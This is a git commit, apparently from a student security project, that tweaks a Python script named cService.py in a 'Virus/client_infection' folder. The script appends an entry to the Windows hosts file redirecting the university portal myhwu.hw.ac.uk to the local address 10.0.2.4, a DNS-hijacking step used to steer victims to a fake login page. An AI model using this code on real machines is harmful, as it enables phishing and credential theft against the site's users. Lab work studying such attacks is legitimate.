f1805eb30afa92fea5b28d2c2741495e6ac1de6b
Jacinth Daniel Moses <jackdanielmoseshs@gmail.com>
2024-03-16 13:57:50 +0400

    updated exe

--- Virus/client_infection/cService.py
+++ Virus/client_infection/cService.py
@@ -1,7 +1,7 @@
 import subprocess
 
 hosts_path = r"C:\Windows\System32\drivers\etc\hosts"
-new_entry = "10.0.2.4  myhwu.hw.ac.uk"
+new_entry = "\n 10.0.2.4  myhwu.hw.ac.uk \n"
 
 # Use subprocess.Popen to execute the echo command with append mode (>>)
 # Note: shell=True is needed to execute shell commands like echo
